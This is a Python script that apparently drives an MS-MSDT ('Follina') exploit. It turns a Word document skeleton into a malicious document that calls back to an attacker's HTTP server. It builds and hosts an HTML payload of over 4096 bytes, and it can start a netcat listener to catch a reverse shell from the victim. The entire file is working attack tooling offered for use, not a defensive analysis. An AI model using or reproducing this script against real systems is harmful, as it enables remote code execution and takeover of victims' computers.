# !/usr/bin/env python3
import os
import threading
from handlers import parse_args, serve_host, copy_stage_word_skeleton, prepare_temp_http_server_location, \
    weaponize_word_skeleton_file, rebuild_legitimate_original_office_file, make_html_endpoint, prepare_b64_payload, \
    build_malicious_html

global_dirs = {
    "bin": "bin",
    "doc": "doc"
}

def main(args):
    # Parse the supplied interface
    # This is done so the maldoc knows what to reach out to.
    server = serve_host(interface=args.interface)
    # Copy the Microsoft Word skeleton into a temporary staging folder
    stg_dir, doc_path = copy_stage_word_skeleton(filename_suffix=global_dirs.get("doc"))
    # Prepare a temporary HTTP server location
    server_path = prepare_temp_http_server_location(directory=stg_dir)
    # Modify the Word skeleton to include our HTTP server
    weaponize_word_skeleton_file(host=server, port=args.port, directory=stg_dir, filename_suffix=global_dirs.get("doc"))
    # Rebuild the original office file
    rebuild_legitimate_original_office_file(output_file=args.output, stagger_path=stg_dir)
    # Base64 encode our command so whitespace is respected
    b64_cmd = prepare_b64_payload(
        host=server, reverse=args.reverse, directory=global_dirs.get("bin")
    ) if args.reverse else args.command
    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = build_malicious_html(b64_payload=b64_cmd, directory=global_dirs.get("bin"))
    # Create our HTML endpoint
    make_html_endpoint(directory=server_path, payload=html_payload)

    class ReuseTCPServer(__import__("socketserver").TCPServer):
        def server_bind(self):
            self.socket.setsockopt(__import__("socket").SOL_SOCKET, __import__("socket").SO_REUSEADDR, 1)
            self.socket.bind(self.server_address)

    class Handler(__import__("http").server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=server_path, **kwargs)

        def log_message(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            if args.reverse:
                return
            else:
                super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", args.port), Handler) as httpd:
            httpd.serve_forever()

    # Host the HTTP server on all interfaces
    print(f"[+] serving html payload on :{args.port}")
    if args.reverse:
        t = threading.Thread(target=serve_http, args=())
        t.start()
        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
        os.system(f"nc -lnvp {args.reverse}")
    else:
        serve_http()


if __name__ == "__main__":
    main(args=parse_args())
